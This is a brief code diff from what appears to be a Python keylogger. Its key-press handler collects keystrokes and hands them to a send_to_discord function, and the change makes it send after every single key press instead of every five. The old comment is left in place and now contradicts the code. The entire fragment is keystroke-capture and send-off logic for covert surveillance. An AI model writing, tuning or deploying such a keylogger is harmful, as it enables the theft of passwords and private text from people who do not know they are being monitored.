@@ -35,7 +35,7 @@ def on_press(key):
     
     logged_keys.append(key_str)
     
-    if len(logged_keys) >= 5:  # Send the log after every 5 key presses
+    if len(logged_keys) >= 1:  # Send the log after every 5 key presses
         log_data = ''.join(logged_keys)
         send_to_discord(log_data)
         logged_keys.clear()
